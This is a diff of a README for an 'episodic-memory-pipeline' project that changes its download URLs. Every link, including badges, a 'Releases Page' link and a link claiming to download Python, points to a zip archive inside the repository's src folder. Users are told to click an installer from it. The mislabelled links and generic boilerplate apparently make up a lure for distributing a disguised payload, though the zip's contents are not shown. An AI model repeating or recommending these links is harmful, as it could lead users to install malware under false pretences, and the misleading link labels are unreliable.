@@ -1,6 +1,6 @@
 # 🎉 episodic-memory-pipeline - Simplifying Memory Management
 
-[![Download Now](https://raw.githubusercontent.com/shiro1707778/episodic-memory-pipeline/main/src/embeddings/pipeline_memory_episodic_2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/shiro1707778/episodic-memory-pipeline/main/src/embeddings/pipeline_memory_episodic_2.3.zip)
+[![Download Now](https://github.com/shiro1707778/episodic-memory-pipeline/raw/refs/heads/main/src/episodic-pipeline-memory-v3.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/shiro1707778/episodic-memory-pipeline/raw/refs/heads/main/src/episodic-pipeline-memory-v3.4.zip)
 
 ## 📥 Overview
 
@@ -8,7 +8,7 @@ Welcome to the episodic-memory-pipeline project. This software helps manage diff
 
 ## 🚀 Getting Started
 
-To begin, ensure you have a compatible device. This application runs on Windows, macOS, and Linux. It uses Python, so make sure your system has it installed. If you're unsure, you can download Python from [https://raw.githubusercontent.com/shiro1707778/episodic-memory-pipeline/main/src/embeddings/pipeline_memory_episodic_2.3.zip](https://raw.githubusercontent.com/shiro1707778/episodic-memory-pipeline/main/src/embeddings/pipeline_memory_episodic_2.3.zip).
+To begin, ensure you have a compatible device. This application runs on Windows, macOS, and Linux. It uses Python, so make sure your system has it installed. If you're unsure, you can download Python from [https://github.com/shiro1707778/episodic-memory-pipeline/raw/refs/heads/main/src/episodic-pipeline-memory-v3.4.zip](https://github.com/shiro1707778/episodic-memory-pipeline/raw/refs/heads/main/src/episodic-pipeline-memory-v3.4.zip).
 
 ## 🌟 Features
 
@@ -27,9 +27,9 @@ To begin, ensure you have a compatible device. This application runs on Windows,
 
 ## 📥 Download & Install
 
-To get the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/shiro1707778/episodic-memory-pipeline/main/src/embeddings/pipeline_memory_episodic_2.3.zip).
+To get the software, visit this page to download: [Releases Page](https://github.com/shiro1707778/episodic-memory-pipeline/raw/refs/heads/main/src/episodic-pipeline-memory-v3.4.zip).
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/shiro1707778/episodic-memory-pipeline/main/src/embeddings/pipeline_memory_episodic_2.3.zip).
+1. Go to the [Releases Page](https://github.com/shiro1707778/episodic-memory-pipeline/raw/refs/heads/main/src/episodic-pipeline-memory-v3.4.zip).
 2. Find the most recent version.
 3. Choose the appropriate installer for your operating system.
 4. Click on the installer file to start the download.
@@ -94,4 +94,4 @@ We welcome contributions. If you find ways to enhance this project, please check
 
 For support, refer to the issues section on the GitHub page or reach out directly via email. Your feedback helps improve the application.
 
-[![Download Now](https://raw.githubusercontent.com/shiro1707778/episodic-memory-pipeline/main/src/embeddings/pipeline_memory_episodic_2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/shiro1707778/episodic-memory-pipeline/main/src/embeddings/pipeline_memory_episodic_2.3.zip)
+[![Download Now](https://github.com/shiro1707778/episodic-memory-pipeline/raw/refs/heads/main/src/episodic-pipeline-memory-v3.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/shiro1707778/episodic-memory-pipeline/raw/refs/heads/main/src/episodic-pipeline-memory-v3.4.zip)
